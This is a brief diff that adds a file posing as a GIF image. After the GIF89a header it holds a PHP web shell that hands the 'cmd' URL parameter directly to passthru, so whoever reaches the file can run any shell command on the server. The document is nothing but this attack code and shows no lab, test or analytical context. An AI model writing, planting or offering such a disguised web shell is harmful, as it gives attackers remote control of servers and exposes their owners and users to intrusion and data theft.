@@ -1,0 +1,5 @@
+GIF89aP;
+<?php
+$cmd = $_GET['cmd'];
+passthru("$cmd", $return);
+?>
